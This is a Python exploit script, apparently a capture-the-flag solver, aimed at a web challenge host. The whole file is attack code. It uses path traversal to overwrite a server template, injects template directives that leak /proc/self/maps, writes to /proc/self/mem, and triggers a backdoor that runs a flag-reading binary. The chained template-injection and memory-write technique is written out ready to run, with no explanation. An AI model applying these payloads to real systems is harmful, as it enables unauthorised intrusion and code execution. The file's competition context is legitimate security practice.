import requests

# Global variables
HOST = "http://hax.perfect.blue:8080"  # Replace with the actual host if different
USERNAME = "viawia"

def send_user_request():
    url = f"{HOST}/user"
    data = {"username": USERNAME}
    response = requests.post(url, data=data)
    return response.text

def send_cyberware_request(name, cyberware_username):
    url = f"{HOST}/cyberware"
    params = {"username": cyberware_username}
    data = {"name": name, "username": USERNAME}
    response = requests.post(url, params=params, data=data)
    return response.text

def get_user(username):
    return requests.get(HOST+"/user", params={"username":username}).text
# User request
user_response = send_user_request()
# print(user_response)

# Cyberware request
LEAK_MAPS = """
SICE{{.GetSerializedError "/proc/self/maps" }}SICE
"""
send_cyberware_request(LEAK_MAPS, "../tmpl/user.html")

leak = "".join([chr(int(X)) for X in get_user(USERNAME).split("SICE")[1][1:-1].split(" ")])
print(leak)

arb_write = """
{{.SerializeErrors  "/bin/readflag" "/proc/self/mem" 9673516}}
"""

send_cyberware_request(arb_write, "../tmpl/user.html")

print(get_user(USERNAME))

exec_command = """
{{.SecretBackdoor}}
"""

send_cyberware_request(exec_command, "../tmpl/user.html")

print(get_user(USERNAME))
